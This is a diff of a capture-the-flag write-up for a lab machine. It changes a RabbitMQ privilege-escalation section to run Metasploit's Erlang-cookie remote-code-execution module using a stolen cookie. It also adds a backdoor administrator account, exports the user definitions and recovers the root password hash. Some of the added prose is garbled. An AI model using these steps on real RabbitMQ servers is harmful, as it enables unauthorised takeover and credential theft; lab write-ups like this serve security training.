@@ -262,78 +262,42 @@ While enumerating the file system, we notice that the `/var/lib/rabbitmq/.erlang
 azrael@forge:~$ ls -la /var/lib/rabbitmq/.erlang.cookie
 -r-----r-- 1 rabbitmq rabbitmq 16 Feb 23 04:45 /var/lib/rabbitmq/.erlang.cookie
 azrael@forge:~$ cat /var/lib/rabbitmq/.erlang.cookie
-UdEX5rcSZi5pg0ow
+m0hOx5SGVy4bLLD5
 ```
 
-### Enumerating RabbitMQ Users
-
-From the earlier port scan, we know that the **RabbitMQ** node is running on the server. We can also confirm this as follows:
+Using metasploit to get a shell:
 
 ```console
-azrael@forge:~$ epmd -names
-epmd: up and running on port 4369 with data:
-name rabbit at port 25672
+msfconsole -q
+use exploit/multi/misc/erlang_cookie_rce
+set rhosts 10.10.176.211
+set lhost 10.23.16.4
+set cookie m0hOx5SGVy4bLLD5
+run
 ```
+![Rabbitmq Hash](2.webp){: width="800" height="400"}
 
-Using the **Erlang Cookie**, we can authenticate and communicate with the **RabbitMQ** node. Since RabbitMQ nodes have the format `rabbit@<hostname>` by default, we add the target's hostname (`forge`) to the `/etc/hosts` file:
-
-```
-10.10.74.18 cloudsite.thm storage.cloudsite.thm forge
-```
-{: file="/etc/hosts" }
-
-Now, we can use the `rabbitmqctl` tool with the discovered cookie to enumerate the **RabbitMQ** instance:
+We can create the user and export the definitions
 
 ```console
-$ sudo rabbitmqctl --erlang-cookie 'UdEX5rcSZi5pg0ow' --node rabbit@forge status
-Status of node rabbit@forge ...
-Runtime
-
-OS PID: 1202
-OS: Linux
-Uptime (seconds): 12736
-Is under maintenance?: false
-RabbitMQ version: 3.9.13
-RabbitMQ release series support status: true
-Node name: rabbit@forge
-...
+rabbitmqctl add_user 0xb0b 0xb0b 
+rabbitmqctl set_permissions -p / 0xb0b ".*" ".*" ".*"
+rabbitmqctl set_user_tags 0xb0b administrator
+rabbitmqadmin export rabbit.definitions.json -u 0xb0b -p 0xb0b
+cat rabbit.definitions.json
 ```
+![Rabbitmq Hash](4.webp){: width="800" height="400"}
 
-Enumerating the users for **RabbitMQ**, we notice a user with an interesting name: `The password for the root user is the SHA-256 hashed value of the RabbitMQ root user's password. Please don't attempt to crack SHA-256.`
-
-```console
-$ sudo rabbitmqctl --erlang-cookie 'UdEX5rcSZi5pg0ow' --node rabbit@forge list_users
-Listing users ...
-user    tags
-The password for the root user is the SHA-256 hashed value of the RabbitMQ root user's password. Please don't attempt to crack SHA-256.       []
-root    [administrator]
-```
-{: .wrap }
+As we can see, we have received a hash of the amount of the user's password. We need the hash amount of the root user.
 
 ### Discovering Root Password
 
 From the username, it appears that the password for the `root` user on the target is the **SHA-256 hash** of the `root` user's password on the **RabbitMQ** instance. We can retrieve this hash using the `export_definitions` command:
 
-```console
-$ sudo rabbitmqctl --erlang-cookie 'UdEX5rcSZi5pg0ow' --node rabbit@forge export_definitions /tmp/definitions.json
-Exporting definitions in JSON to a file at "/tmp/definitions.json" ...
-
-$ cat /tmp/definitions.json | jq '.users[] | select(.name == "root")'
-{
-  "hashing_algorithm": "rabbit_password_hashing_sha256",
-  "limits": {},
-  "name": "root",
-  "password_hash": "49e6[REDACTED]BzWF",
-  "tags": [
-    "administrator"
-  ]
-}
-```
-{: .wrap }
 
 The hash we received is in **base64** and according to the [RabbitMQ documentation](https://www.rabbitmq.com/docs/passwords#this-is-the-algorithm), it follows the structure: **`base64(<4 byte salt> + sha256(<4 byte salt> + <password>))`**.
 
-![Rabbitmq Hash](rabbitmq_hash.webp){: width="800" height="400"}
+![Rabbitmq Hash](5.webp){: width="800" height="400"}
 
 To retrieve the hash, we first convert the **base64** hash to **hex**:
 
@@ -352,7 +316,7 @@ Password: 295d1d16[REDACTED]98073585
 root@forge:~# wc -c /root/root.txt
 33 /root/root.txt
 ```
-
+![Rabbitmq Hash](6.webp){: width="800" height="400"}
 <style>
 .center img {
   display:block;
